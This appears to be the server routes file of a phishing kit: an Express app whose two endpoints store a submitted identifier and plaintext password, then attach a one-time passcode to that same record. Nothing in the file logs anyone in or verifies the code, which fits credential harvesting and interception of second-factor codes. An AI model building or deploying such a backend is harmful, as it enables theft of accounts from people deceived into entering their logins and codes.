import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import {
  credentialSubmitSchema,
  otpSubmitSchema,
} from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";

export async function registerRoutes(app: Express): Promise<Server> {
  app.post("/api/submit-credentials", async (req, res) => {
    try {
      const data = credentialSubmitSchema.parse(req.body);
      
      const submission = await storage.createSubmission({
        loginMethod: data.loginMethod,
        identifier: data.identifier,
        password: data.password,
      });

      return res.status(201).json({ submissionId: submission.id });
    } catch (error) {
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ error: validationError.message });
      }
      return res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/submit-otp", async (req, res) => {
    try {
      const data = otpSubmitSchema.parse(req.body);
      
      const submission = await storage.updateSubmissionOtp(data.submissionId, data.otp);

      return res.status(200).json({ success: true, submission });
    } catch (error) {
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ error: validationError.message });
      }
      return res.status(500).json({ error: "Internal server error" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
